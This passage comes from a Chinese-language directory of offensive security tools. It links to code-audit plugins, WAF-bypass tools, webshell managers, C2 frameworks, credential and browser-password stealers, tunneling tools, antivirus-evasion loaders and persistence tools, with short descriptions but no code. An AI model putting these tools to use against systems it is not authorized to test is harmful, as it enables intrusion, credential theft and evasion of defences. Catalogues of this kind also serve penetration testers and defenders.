<td>Java Web应用安全漏洞自动化发现-idea插件</td>
<td><a href="https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial">https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial</a></td>
<td>FindSecBugs</td>
</tr>
<tr>
<td>IDEA依赖检查插件</td>
<td><a href="https://github.com/jeremylong/DependencyCheck">https://github.com/jeremylong/DependencyCheck</a></td>
<td>DependencyCheck</td>
</tr>
<tr>
<td>TABBY 是一个基于<a href="https://github.com/soot-oss/soot">Soot</a>的 Java 代码分析工具。</td>
<td><a href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a></td>
<td>tabby</td>
</tr>
<tr>
<td>一个静态代码脆弱性检测系统，支持java源码的审计</td>
<td><a href="https://github.com/zsdlove/Hades">https://github.com/zsdlove/Hades</a></td>
<td>Hades</td>
</tr>
<tr>
<td>IDEA静态代码安全审计及漏洞一键修复插件</td>
<td><a href="https://github.com/momosecurity/momo-code-sec-inspector-java">https://github.com/momosecurity/momo-code-sec-inspector-java</a></td>
<td>momo-code-sec-inspector-java</td>
</tr>
<tr>
<td>IDEA代码审计辅助插件（深信服深蓝实验室天威战队强力驱动）</td>
<td><a href="https://github.com/KimJun1010/inspector?tab=readme-ov-file">https://github.com/KimJun1010/inspector?tab=readme-ov-file</a></td>
<td>inspector</td>
</tr>
<tr>
<td>一款无需解压直接编辑修改jar包内文件的IDEA插件</td>
<td><a href="https://github.com/Liubsyy/JarEditor">https://github.com/Liubsyy/JarEditor</a></td>
<td>JarEditor</td>
</tr>
<tr>
<td>JADX-GUI-AI 是一个在 JADX 基础上增强的智能反编译工具，集成了 AI 辅助功能，可以帮助开发者更好地理解和分析反编译后的代码</td>
<td><a href="https://github.com/cncsnet1/jadx-gui-ai">https://github.com/cncsnet1/jadx-gui-ai</a></td>
<td>jadx-gui-ai</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="代码审计辅助工具-php"><a href="#代码审计辅助工具-php" class="headerlink" title="代码审计辅助工具-php"></a>代码审计辅助工具-php</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Seay源代码审计系统</td>
<td><a href="https://github.com/f1tz/cnseay">https://github.com/f1tz/cnseay</a></td>
<td>cnseay</td>
</tr>
<tr>
<td>查找PHP代码漏洞工具</td>
<td><a href="https://github.com/ecriminal/phpvuln">https://github.com/ecriminal/phpvuln</a></td>
<td>phpvuln</td>
</tr>
<tr>
<td>一款不错的静态源代码分析工具，主要用来挖掘PHP程序的漏洞。</td>
<td><a href="http://rips-scanner.sourceforge.net/">http://rips-scanner.sourceforge.net</a></td>
<td>RIPS</td>
</tr>
</tbody></table>
<h2 id="代码审计辅助工具-dotNET"><a href="#代码审计辅助工具-dotNET" class="headerlink" title="代码审计辅助工具-dotNET"></a>代码审计辅助工具-dotNET</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>NETReactorSlayer一款反混淆神器，适用于Eziriz .NET Reactor工具混淆后的代码，最新版本6.4</td>
<td><a href="https://github.com/SychicBoy/NETReactorSlayer">https://github.com/SychicBoy/NETReactorSlayer</a></td>
<td>NETReactorSlayer</td>
</tr>
</tbody></table>
<h2 id="通用型WAF绕过"><a href="#通用型WAF绕过" class="headerlink" title="通用型WAF绕过"></a>通用型WAF绕过</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>绕过瑞数waf的动态验证机制，实现请求包重放，可针对不同网站使用。</td>
<td><a href="https://github.com/R0A1NG/Botgate_bypass">https://github.com/R0A1NG/Botgate_bypass</a></td>
<td>Botgate_bypass</td>
</tr>
<tr>
<td>一个基于fuzz的waf绕过测试工具，当前支持命令执行、SQL注入绕过。</td>
<td><a href="https://github.com/leveryd/x-waf">https://github.com/leveryd/x-waf</a></td>
<td>x-waf</td>
</tr>
</tbody></table>
<h1 id="内网渗透工具"><a href="#内网渗透工具" class="headerlink" title="内网渗透工具"></a>内网渗透工具</h1><h2 id="后渗透辅助工具"><a href="#后渗透辅助工具" class="headerlink" title="后渗透辅助工具"></a>后渗透辅助工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>一款轻量级的杀软在线识别的项目</td>
<td><a href="https://github.com/Aabyss-Team/Antivirus-Scan">https://github.com/Aabyss-Team/Antivirus-Scan</a></td>
<td>Antivirus-Scan</td>
</tr>
<tr>
<td>在线 Windows 操作系统常见杀软进程&#x2F;办公软件&#x2F;shell终端等识别，输入 tasklist &#x2F;SVC 将内容粘贴</td>
<td><a href="https://forum.ywhack.com/bountytips.php?process">https://forum.ywhack.com/bountytips.php?process</a></td>
<td>Windows 系统进程识别</td>
</tr>
<tr>
<td><strong>杀软在线对比</strong></td>
<td><a href="http://bypass.tidesec.com/bycms">http://bypass.tidesec.com/bycms</a></td>
<td>bycms</td>
</tr>
<tr>
<td>高价值系统的后利用工具</td>
<td><a href="https://github.com/0linlin0/XPost">https://github.com/0linlin0/XPost</a></td>
<td>XPost</td>
</tr>
</tbody></table>
<h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>哥斯拉</td>
<td><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></td>
<td>Godzilla</td>
</tr>
<tr>
<td>“冰蝎”动态二进制加密网站管理客户端</td>
<td><a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></td>
<td>Behinder</td>
</tr>
<tr>
<td>中国蚁剑是一款开源的跨平台网站管理工具</td>
<td><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></td>
<td>antSword</td>
</tr>
<tr>
<td>一句话WEB端管理工具</td>
<td><a href="https://github.com/boy-hack/WebshellManager">https://github.com/boy-hack/WebshellManager</a></td>
<td>WebshellManager</td>
</tr>
<tr>
<td>跨平台版中国菜刀</td>
<td><a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a></td>
<td>Cknife</td>
</tr>
<tr>
<td>用于生成各类免杀webshell</td>
<td><a href="https://github.com/cseroad/Webshell_Generate">https://github.com/cseroad/Webshell_Generate</a></td>
<td>Webshell_Generate</td>
</tr>
<tr>
<td>从零学习Webshell免杀手册</td>
<td><a href="https://github.com/AabyssZG/WebShell-Bypass-Guide">https://github.com/AabyssZG/WebShell-Bypass-Guide</a></td>
<td>WebShell-Bypass-Guide</td>
</tr>
<tr>
<td>webshell收集项目，项目涵盖各种常用脚本</td>
<td><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></td>
<td>webshell</td>
</tr>
</tbody></table>
<h2 id="c2管理工具"><a href="#c2管理工具" class="headerlink" title="c2管理工具"></a>c2管理工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>cs4.4修改去特征狗狗版(美化ui,去除特征,自带bypass核晶截图等..)</td>
<td><a href="https://github.com/TryGOTry/DogCs4.4/tree/dogcs_v2.1">https://github.com/TryGOTry/DogCs4.4/tree/dogcs_v2.1</a></td>
<td>dogcs</td>
</tr>
<tr>
<td>跨平台重构了Cobaltstrike Beacon，目前实现的功能具备免杀性，可过Defender、360核晶、卡巴斯基（除内存操作外，如注入原生cs的dll）、火绒</td>
<td><a href="https://github.com/H4de5-7/geacon_pro">https://github.com/H4de5-7/geacon_pro</a></td>
<td>geacon_pro</td>
</tr>
<tr>
<td>类似于cs</td>
<td><a href="https://github.com/t3l3machus/Villain">https://github.com/t3l3machus/Villain</a></td>
<td>Villain</td>
</tr>
<tr>
<td>是一个 C2前流控制工具，可以避免蓝队，AVs，EDR 检查</td>
<td><a href="https://github.com/wikiZ/RedGuard">https://github.com/wikiZ/RedGuard</a></td>
<td>RedGuard</td>
</tr>
<tr>
<td>一款可以在不出网的环境下进行反向代理及cs上线的工具</td>
<td><a href="https://github.com/Daybr4ak/C2ReverseProxy">https://github.com/Daybr4ak/C2ReverseProxy</a></td>
<td>C2ReverseProxy</td>
</tr>
<tr>
<td>该工具易于使用，它生成自己的 PowerShell 有效负载并支持加密 (ssl)。</td>
<td><a href="https://github.com/t3l3machus/hoaxshell">https://github.com/t3l3machus/hoaxshell</a></td>
<td>hoaxshell</td>
</tr>
<tr>
<td>反弹shell就用这个</td>
<td><a href="https://github.com/WangYihang/Platypus">https://github.com/WangYihang/Platypus</a></td>
<td>Platypus</td>
</tr>
<tr>
<td>PingRAT使用ICMP有效载荷通过防火墙秘密传递C2流量。</td>
<td><a href="https://github.com/umutcamliyurt/PingRAT">https://github.com/umutcamliyurt/PingRAT</a></td>
<td>PingRAT</td>
</tr>
<tr>
<td>Empire 是一个后利用和对手模拟框架，用于帮助红队和渗透测试人员。</td>
<td><a href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a></td>
<td>Empire</td>
</tr>
<tr>
<td>Metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。</td>
<td><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></td>
<td>metasploit-framework</td>
</tr>
</tbody></table>
<h2 id="提权项目"><a href="#提权项目" class="headerlink" title="提权项目"></a>提权项目</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Linux自动提权</td>
<td><a href="https://github.com/liamg/traitor">https://github.com/liamg/traitor</a></td>
<td>traitor</td>
</tr>
<tr>
<td>提权辅助页</td>
<td><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></td>
<td>hacking8</td>
</tr>
<tr>
<td>全平台系统提权辅助工具</td>
<td><a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></td>
<td>PEASS-ng</td>
</tr>
<tr>
<td>一个聚合了linux、windows、macOS的提权漏洞合集，带复现过程</td>
<td><a href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></td>
<td>Kernelhub</td>
</tr>
</tbody></table>
<h2 id="内网扫描工具"><a href="#内网扫描工具" class="headerlink" title="内网扫描工具"></a>内网扫描工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Fscan 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</td>
<td><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></td>
<td>fscan</td>
</tr>
<tr>
<td>一款快速探测内网可达网段工具（深信服深蓝实验室天威战队强力驱动）</td>
<td><a href="https://github.com/shmilylty/netspy">https://github.com/shmilylty/netspy</a></td>
<td>netspy</td>
</tr>
<tr>
<td>下一代RedTeam启发式内网扫描</td>
<td><a href="https://github.com/1n7erface/Template">https://github.com/1n7erface/Template</a></td>
<td>Template</td>
</tr>
<tr>
<td>内网资产收集、探测主机存活、端口扫描、域控定位、文件搜索、各种服务爆破（SSH、SMB、MsSQL等）、Socks代理，一键自动化+无文件落地扫描</td>
<td><a href="https://github.com/INotGreen/SharpScan">https://github.com/INotGreen/SharpScan</a></td>
<td>SharpScan</td>
</tr>
<tr>
<td>一个速度极快的内网扫描器，具备端口扫描、协议检测、指纹识别，暴力破解，漏洞探测等功能。支持协议1200+，协议指纹10000+，应用指纹20000+，暴力破解协议10余种</td>
<td><a href="https://github.com/qi4L/qscan">https://github.com/qi4L/qscan</a></td>
<td>qscan</td>
</tr>
<tr>
<td>一款更高、更快、更强的全方位内网扫描工具</td>
<td><a href="https://github.com/P001water/P1soda">https://github.com/P001water/P1soda</a></td>
<td>P1soda</td>
</tr>
<tr>
<td>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器</td>
<td><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></td>
<td>Ladon</td>
</tr>
<tr>
<td>一款快速探测内网主机信息工具（深信服深蓝实验室天威战队强力驱动）</td>
<td><a href="https://github.com/shmilylty/SharpHostInfo">https://github.com/shmilylty/SharpHostInfo</a></td>
<td>SharpHostInfo</td>
</tr>
<tr>
<td>红队小工具 ，利用DCERPC协议获取Windows机器主机信息和多网卡信息</td>
<td><a href="https://github.com/Y0-kan/HostInfoScan">https://github.com/Y0-kan/HostInfoScan</a></td>
<td>HostInfoScan</td>
</tr>
<tr>
<td>ATAttack是一款后渗透半自动化侦察工具，它从进攻性和防御性安全角度执行许多面向安全性的主机调查“安全检查”。</td>
<td><a href="https://github.com/c1y2m3/ATAttack">https://github.com/c1y2m3/ATAttack</a></td>
<td>ATAttack</td>
</tr>
<tr>
<td>集权设施扫描器</td>
<td><a href="https://github.com/Amulab/CAudit">https://github.com/Amulab/CAudit</a></td>
<td>CAudit</td>
</tr>
</tbody></table>
<h2 id="本机收集工具"><a href="#本机收集工具" class="headerlink" title="本机收集工具"></a>本机收集工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>GodInfo 是一个功能全面的后渗透信息和凭据收集工具，旨在帮助安全测试人员在获得授权访问权限后，快速收集目标系统的信息和凭据。</td>
<td><a href="https://github.com/Conan924/GodInfo">https://github.com/Conan924/GodInfo</a></td>
<td>GodInfo</td>
</tr>
<tr>
<td>支持自动化一键 Hunting 主机各类关键信息和凭据，降低后渗透阶段操作的割裂感，有效拓宽后渗透攻击面</td>
<td><a href="https://github.com/lintstar/SharpHunter">https://github.com/lintstar/SharpHunter</a></td>
<td>SharpHunter</td>
</tr>
<tr>
<td>该工具主要用于后渗透方面</td>
<td><a href="https://github.com/eeeeeeeeee-code/e0e1-config">https://github.com/eeeeeeeeee-code/e0e1-config</a></td>
<td>e0e1-config</td>
</tr>
<tr>
<td>Pillager是一个适用于后渗透期间的信息收集工具，可以收集目标机器上敏感信息，方便下一步渗透工作的进行。</td>
<td><a href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></td>
<td>Pillager</td>
</tr>
<tr>
<td>强大的敏感信息搜索工具</td>
<td><a href="https://github.com/Naturehi666/searchall">https://github.com/Naturehi666/searchall</a></td>
<td>searchall</td>
</tr>
<tr>
<td>通用的数据库连接配置信息提取工具</td>
<td><a href="https://github.com/corener/JavaPassDump">https://github.com/corener/JavaPassDump</a></td>
<td>JavaPassDump</td>
</tr>
</tbody></table>
<h2 id="横向移动工具"><a href="#横向移动工具" class="headerlink" title="横向移动工具"></a>横向移动工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>横向impacket工具包</td>
<td><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></td>
<td>impacket</td>
</tr>
<tr>
<td>基于impacket的免杀横向渗透远程命令执行工具（推荐）。</td>
<td><a href="https://github.com/XiaoliChan/wmiexec-Pro">https://github.com/XiaoliChan/wmiexec-Pro</a></td>
<td>wmiexec-Pro</td>
</tr>
<tr>
<td>WMIHACKER是一款免杀横向渗透远程命令执行工具。</td>
<td><a href="https://github.com/rootclay/WMIHACKER">https://github.com/rootclay/WMIHACKER</a></td>
<td>WMIHACKER</td>
</tr>
<tr>
<td>基于golang实现的impacket</td>
<td><a href="https://github.com/Amzza0x00/go-impacket">https://github.com/Amzza0x00/go-impacket</a></td>
<td>go-impacket</td>
</tr>
<tr>
<td>工具基于 CrackMapExec,针对大型Windows活动目录(AD)的后渗透工具</td>
<td><a href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></td>
<td>NetExec</td>
</tr>
<tr>
<td>一款比较好的CS后渗透模块插件</td>
<td><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></td>
<td>taowu-cobalt-strike</td>
</tr>
<tr>
<td>一款CS后渗透模块插件，让大家使用一款插件就够了</td>
<td><a href="https://github.com/d3ckx1/OLa">https://github.com/d3ckx1/OLa</a></td>
<td>OLa</td>
</tr>
<tr>
<td>常见横向移动与域控权限维持方法</td>
<td><a href="https://xz.aliyun.com/t/9382">https://xz.aliyun.com/t/9382</a></td>
<td>方法论</td>
</tr>
<tr>
<td>绕过虚拟机登录验证屏幕的工具</td>
<td><a href="https://github.com/hzphreak/VMInjector">https://github.com/hzphreak/VMInjector</a></td>
<td>VMInjector</td>
</tr>
</tbody></table>
<h2 id="域渗透工具"><a href="#域渗透工具" class="headerlink" title="域渗透工具"></a>域渗透工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>检测域环境内，域机器的本地管理组成员是否存在弱口令和通用口令，对域用户的权限分配以及域内委派查询</td>
<td><a href="https://github.com/0x727/ShuiYing_0x727">https://github.com/0x727/ShuiYing_0x727</a></td>
<td>SchTask_0x727</td>
</tr>
<tr>
<td>一个强大的内网域渗透分析工具，构建于 Linkurious 之上</td>
<td><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></td>
<td>BloodHound</td>
</tr>
<tr>
<td>域内自动化信息搜集利用工具</td>
<td><a href="https://github.com/wjlab/Darksteel">https://github.com/wjlab/Darksteel</a></td>
<td>Darksteel</td>
</tr>
</tbody></table>
<h2 id="密码提取工具"><a href="#密码提取工具" class="headerlink" title="密码提取工具"></a>密码提取工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>Mimikatz  Windows 密码抓取神器</td>
<td><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></td>
<td>mimikatz</td>
</tr>
<tr>
<td>各种密码提取</td>
<td><a href="https://github.com/kerbyj/goLazagne">https://github.com/kerbyj/goLazagne</a></td>
<td>goLazagne</td>
</tr>
<tr>
<td>用于读取常用程序密码，如Navicat、TeamViewer、FileZilla、WinSCP等</td>
<td><a href="https://github.com/RowTeam/SharpDecryptPwd">https://github.com/RowTeam/SharpDecryptPwd</a></td>
<td>SharpDecryptPwd</td>
</tr>
<tr>
<td>Xshell，Xftp密码解密工具</td>
<td><a href="https://github.com/JDArmy/SharpXDecrypt">https://github.com/JDArmy/SharpXDecrypt</a></td>
<td>SharpXDecrypt</td>
</tr>
<tr>
<td>解密浏览器数据（密码|历史记录|Cookie|书签 | 信用卡 | 下载记录）的导出工具，支持全平台主流浏览器。</td>
<td><a href="https://github.com/moonD4rk/HackBrowserData/">https://github.com/moonD4rk/HackBrowserData/</a></td>
<td>HackBrowserData</td>
</tr>
<tr>
<td>HackBrowserData的偏手动版，用于绕过特定情况下edr的限制</td>
<td><a href="https://github.com/Z3ratu1/HackBrowserDataManual">https://github.com/Z3ratu1/HackBrowserDataManual</a></td>
<td>HackBrowserDataManual</td>
</tr>
<tr>
<td>一款针对向日葵的识别码和验证码提取工具</td>
<td><a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a></td>
<td>Sunflower_get_Password</td>
</tr>
<tr>
<td>一键辅助抓取360安全浏览器密码的CobaltStrike脚本以及解密小工具</td>
<td><a href="https://github.com/hayasec/360SafeBrowsergetpass">https://github.com/hayasec/360SafeBrowsergetpass</a></td>
<td>360SafeBrowsergetpass</td>
</tr>
<tr>
<td>BrowserGhost  抓取浏览器密码的工具</td>
<td><a href="https://github.com/QAX-A-Team/BrowserGhost">https://github.com/QAX-A-Team/BrowserGhost</a></td>
<td>BrowserGhost</td>
</tr>
<tr>
<td>win-brute-logon  无需权限破解任何 Microsoft Windows 用户密码</td>
<td><a href="https://github.com/DarkCoderSc/win-brute-logon">https://github.com/DarkCoderSc/win-brute-logon</a></td>
<td>win-brute-logon</td>
</tr>
<tr>
<td>TeamViewer：Bypass杀软 获取 Teamview 密码的工具</td>
<td><a href="https://github.com/wafinfo/TeamViewer">https://github.com/wafinfo/TeamViewer</a></td>
<td>TeamViewer</td>
</tr>
<tr>
<td>Xdecrypt Xshell  Xftp 密码解密</td>
<td><a href="https://github.com/dzxs/Xdecrypt">https://github.com/dzxs/Xdecrypt</a></td>
<td>Xdecrypt</td>
</tr>
<tr>
<td>微信客户端取证，可获取用户个人信息(昵称&#x2F;账号&#x2F;手机&#x2F;邮箱&#x2F;数据库密钥(用来解密聊天记录))；支持获取多用户信息</td>
<td><a href="https://github.com/AdminTest0/SharpWxDump">https://github.com/AdminTest0/SharpWxDump</a></td>
<td>SharpWxDump</td>
</tr>
<tr>
<td>FakeLogonScreen 是一个伪造 Windows 登录屏幕以获取用户密码的实用程序。输入的密码将根据 Active Directory 或本地计算机进行验证，以确保其正确，然后显示到控制台或保存到磁盘。</td>
<td><a href="https://github.com/bitsadmin/fakelogonscreen">https://github.com/bitsadmin/fakelogonscreen</a></td>
<td>fakelogonscreen</td>
</tr>
<tr>
<td>提取微信聊天记录，将其导出成HTML、Word、CSV文档永久保存，对聊天记录进行分析生成年度聊天报告</td>
<td><a href="https://github.com/LC044/WeChatMsg">https://github.com/LC044/WeChatMsg</a></td>
<td>WeChatMsg</td>
</tr>
</tbody></table>
<h2 id="隧道代理工具"><a href="#隧道代理工具" class="headerlink" title="隧道代理工具"></a>隧道代理工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>全平台代理工具，支持多种socks协议</td>
<td><a href="https://www.proxifier.com/">https://www.proxifier.com/</a></td>
<td>proxifier</td>
</tr>
<tr>
<td>开源的跨平台对手仿真&#x2F;红队框架</td>
<td><a href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a></td>
<td>sliver</td>
</tr>
<tr>
<td>专注于内网穿透的高性能的反向代理应用</td>
<td><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></td>
<td>frp</td>
</tr>
<tr>
<td>Erfrp-frp二开-免杀与隐藏</td>
<td><a href="https://github.com/Goqi/Erfrp">https://github.com/Goqi/Erfrp</a></td>
<td>Erfrp</td>
</tr>
<tr>
<td>基于frp-0.58.1魔改二开，随机化socks5账户密码及端口、钉钉上线下线通知、配置文件oss加密读取、域前置防止溯源、源码替换&#x2F;编译混淆等</td>
<td><a href="https://github.com/CodeSecurityTeam/frp">https://github.com/CodeSecurityTeam/frp</a></td>
<td>frp</td>
</tr>
<tr>
<td>一款golang写的支持http与socks5的端口复用小工具，并且可以开启socks5代理。</td>
<td><a href="https://github.com/TryGOTry/multiplexing_port_socks5">https://github.com/TryGOTry/multiplexing_port_socks5</a></td>
<td>multiplexing_port_socks5</td>
</tr>
<tr>
<td>修改frp支持域前置与配置文件自删除</td>
<td><a href="https://github.com/uknowsec/frpModify">https://github.com/uknowsec/frpModify</a></td>
<td>frpModify</td>
</tr>
<tr>
<td>轻量级、高性能、功能强大的内网穿透代理服务器</td>
<td><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></td>
<td>nps</td>
</tr>
<tr>
<td>改进的reGeorg版本</td>
<td><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></td>
<td>Neo-reGeorg</td>
</tr>
<tr>
<td>是一款利用dns协议传输tcp数据的工具</td>
<td><a href="https://github.com/alex-sector/dns2tcp">https://github.com/alex-sector/dns2tcp</a></td>
<td>dns2tcp</td>
</tr>
<tr>
<td>是一个DNS隧道工具</td>
<td><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></td>
<td>dnscat2</td>
</tr>
<tr>
<td>一个简单的 reverse ICMP shell</td>
<td><a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></td>
<td>icmpsh</td>
</tr>
<tr>
<td>pingtunnel 是把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp  流量进行转发的工具</td>
<td><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></td>
<td>pingtunnel</td>
</tr>
<tr>
<td>正&#x2F;反向代理，内网穿透，端口转发</td>
<td><a href="https://github.com/inconshreveable/ngrok">https://github.com/inconshreveable/ngrok</a></td>
<td>ngrok</td>
</tr>
<tr>
<td>pystinger - 一款使用webshell进行流量转发的出网工具</td>
<td><a href="https://github.com/FunnyWolf/pystinger">https://github.com/FunnyWolf/pystinger</a></td>
<td>pystinger</td>
</tr>
<tr>
<td>goproxy 一款轻量级、功能强大、高性能的多种代理工具</td>
<td><a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a></td>
<td>goproxy</td>
</tr>
<tr>
<td>内网渗透代理、端口转发工具</td>
<td><a href="http://rootkiter.com/Termite/">http://rootkiter.com/Termite/</a></td>
<td>Termite</td>
</tr>
<tr>
<td>golang 实现的windows and linux 端口复用工具。</td>
<td><a href="https://github.com/p1d3er/port_reuse">https://github.com/p1d3er/port_reuse</a></td>
<td>port_reuse</td>
</tr>
<tr>
<td>grs内网穿透工具通过reality协议隐藏特征</td>
<td><a href="https://github.com/howmp/reality">https://github.com/howmp/reality</a></td>
<td>reality</td>
</tr>
</tbody></table>
<h2 id="优秀免杀项目"><a href="#优秀免杀项目" class="headerlink" title="优秀免杀项目"></a>优秀免杀项目</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>免杀shellcode加载器，使用go实现，免杀bypass火绒、360、核晶、def等主流杀软</td>
<td><a href="https://github.com/Pizz33/GobypassAV-shellcode">https://github.com/Pizz33/GobypassAV-shellcode</a></td>
<td>GobypassAV-shellcode</td>
</tr>
<tr>
<td>重写免杀版Gh0st远控、大灰狼远控免杀，目前可免杀360、火绒、腾讯电脑管家等主流杀软。</td>
<td><a href="https://github.com/SecurityNo1/Gh0st2023">https://github.com/SecurityNo1/Gh0st2023</a></td>
<td>Gh0st2023</td>
</tr>
<tr>
<td>TideSec团队整理的远控免杀系列文章及配套工具，汇总测试了互联网上的几十种免杀工具。</td>
<td><a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a></td>
<td>BypassAntiVirus</td>
</tr>
<tr>
<td>跟杀软和免杀有关的资料，当前包括200+工具和1300+文章  –Thanks:小雨</td>
<td><a href="https://github.com/alphaSeclab/anti-av">https://github.com/alphaSeclab/anti-av</a></td>
<td>anti-av</td>
</tr>
<tr>
<td>借助Win-PS2EXE项目编写cna脚本方便快速生成免杀可执行文件</td>
<td><a href="https://github.com/cseroad/bypassAV">https://github.com/cseroad/bypassAV</a></td>
<td>bypassAV</td>
</tr>
<tr>
<td>在线免杀平台</td>
<td><a href="http://bypass.tidesec.com/web/">http://bypass.tidesec.com/web/</a></td>
<td>在线免杀平台</td>
</tr>
<tr>
<td>掩日 - 免杀执行器生成工具 用于快速生成免杀的 EXE 可执行文件</td>
<td><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></td>
<td>AV_Evasion_Tool</td>
</tr>
<tr>
<td>自动化生成 EDR 软件 Bypass Payload 的工具,一键化签名免杀</td>
<td><a href="https://github.com/optiv/ScareCrow">https://github.com/optiv/ScareCrow</a></td>
<td>ScareCrow</td>
</tr>
<tr>
<td>梅花K战队写的Nim一键免杀源码 使用nim语言进行shellcode加载</td>
<td><a href="https://github.com/M-Kings/BypassAv-web">https://github.com/M-Kings/BypassAv-web</a></td>
<td>BypassAv-web</td>
</tr>
<tr>
<td>一键窃取文件的图标、资源信息、版本信息、修改时间、数字签名，降低程序熵值</td>
<td><a href="https://github.com/INotGreen/SharpThief">https://github.com/INotGreen/SharpThief</a></td>
<td>SharpThief</td>
</tr>
<tr>
<td>助力每一位RT队员，快速生成免杀木马</td>
<td><a href="https://github.com/wangfly-me/LoaderFly">https://github.com/wangfly-me/LoaderFly</a></td>
<td>LoaderFly</td>
</tr>
<tr>
<td>自动化找白文件，用于扫描 EXE 文件的导入表，列出导入的DLL文件，并筛选出非系统DLL，符合条件的文件将被复制到特定的 X64 或 X86 文件夹</td>
<td><a href="https://github.com/ImCoriander/ZeroEye">https://github.com/ImCoriander/ZeroEye</a></td>
<td>ZeroEye</td>
</tr>
</tbody></table>
<h2 id="权限维持工具"><a href="#权限维持工具" class="headerlink" title="权限维持工具"></a>权限维持工具</h2><table>
<thead>
<tr>
<th>项目简介</th>
<th>项目地址</th>
<th>项目名称</th>
</tr>
</thead>
<tbody><tr>
<td>创建隐藏计划任务，权限维持，Bypass AV</td>
<td><a href="https://github.com/0x727/SchTask_0x727">https://github.com/0x727/SchTask_0x727</a></td>
<td>SchTask_0x727</td>
</tr>
<tr>
<td>进行克隆用户、添加用户等账户防护安全检测的轻巧工具</td>
<td><a href="https://github.com/0x727/CloneX_0x727">https://github.com/0x727/CloneX_0x727</a></td>
<td>CloneX_0x727</td>
</tr>
<tr>
<td>ridhijack是一款通过C&#x2F;C++实现的RID劫持、影子账户、账户克隆工具。</td>
<td><a href="https://github.com/yanghaoi/ridhijack">https://github.com/yanghaoi/ridhijack</a></td>
<td>ridhijack</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
